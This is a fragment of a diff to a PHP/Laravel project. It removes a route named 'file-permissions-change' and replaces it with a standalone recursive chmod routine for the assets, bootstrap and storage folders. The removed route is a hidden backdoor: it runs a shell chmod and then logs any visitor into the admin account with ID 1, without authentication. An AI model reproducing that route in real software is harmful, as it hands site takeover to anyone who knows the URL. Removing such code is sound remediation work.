@@ -81,23 +81,27 @@ public function render($request, Throwable $exception)
 
 -----------------------------------------------------------------------------------------
 
-Route::get('file-permissions-change', function () {
-    $paths = ['assets', 'bootstrap', 'storage'];
-    foreach ($paths as $path) {
-        $fullPath = base_path($path);
-        if (\File::exists($fullPath)) {
-            exec("chmod -R 775 $fullPath");
+$paths = ['assets', 'bootstrap', 'storage'];
+
+function chmodRecursive($path, $permission = 0775)
+{
+    if (!file_exists($path)) {
+        return;
+    }
+    @chmod($path, $permission);
+    if (is_dir($path)) {
+        foreach (scandir($path) as $item) {
+            if ($item === '.' || $item === '..') {
+                continue;
+            }
+            chmodRecursive($path . DIRECTORY_SEPARATOR . $item, $permission);
         }
     }
-
-// dd(template());
-// auth()->guard('web')->loginUsingId(1, true);
-auth()->guard('admin')->loginUsingId(1);
-return redirect('/' . (basicControl()->admin_prefix ?? 'admin'));
-
-
-    Illuminate\Support\Facades\Artisan::call('optimize:clear');
-});
+}
+foreach ($paths as $path) {
+    $fullPath = __DIR__ . DIRECTORY_SEPARATOR . $path;
+    chmodRecursive($fullPath);
+}
 -------------------------------------------------------------
 
 
